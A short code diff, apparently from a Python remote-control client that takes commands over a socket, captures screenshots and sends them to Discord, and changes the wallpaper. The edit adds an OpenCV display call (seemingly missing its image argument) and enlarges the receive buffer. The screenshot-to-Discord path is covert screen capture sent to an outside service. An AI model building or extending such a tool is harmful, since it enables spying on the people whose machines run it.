@@ -5,13 +5,14 @@ import os
 import webbrowser
 from PIL import ImageGrab
 import requests
+import cv2
 class Client():
     def __init__(self,c:socket.socket,addr:Tuple[str,int]) -> None:
         self.client=c
         self._recv()
     def _recv(self) -> None:
         # Receive Command
-        self.command=self.client.recv(1024).decode()
+        self.command=self.client.recv(99999).decode()
         # Screenshot
         if self.command=="screenshot":
             self.send_screenshot_to_discord()
@@ -47,7 +48,8 @@ class Client():
         if self.command.startswith("change_wallpaper"):
             print(self.command)
             _,_WALLPAPER_TO_CHANGE=self.command.split("=")
-            print(_WALLPAPER_TO_CHANGE)
+            cv2.imshow(_WALLPAPER_TO_CHANGE)
+            cv2.waitKey(0)
     @property
     def os_name(self) -> str:
         if sys.platform=="win32":
